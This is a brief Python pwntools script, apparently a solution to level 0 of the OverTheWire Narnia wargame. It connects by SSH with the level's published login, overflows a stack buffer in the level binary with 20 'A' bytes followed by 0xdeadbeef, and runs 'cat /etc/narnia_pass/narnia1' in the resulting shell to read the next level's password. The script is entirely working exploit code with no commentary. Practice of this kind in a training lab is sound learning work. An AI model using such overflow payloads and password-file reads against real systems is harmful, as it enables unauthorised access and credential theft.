from pwn import *
context(arch='amd64', os='linux')
deadbeef = p32(0xdeadbeef, endian='little')


def main():
    session = ssh(user='narnia0', host='narnia.labs.overthewire.org', port=2226, password='narnia0')
    program = session.run('/narnia/narnia0')
    program.sendline(b'A'*20 + deadbeef)
    program.sendline('cat /etc/narnia_pass/narnia1')
    output = str(program.recvrepeat(timeout=2))
    session.close()
    log.info(output)


if __name__ == '__main__':
    main()
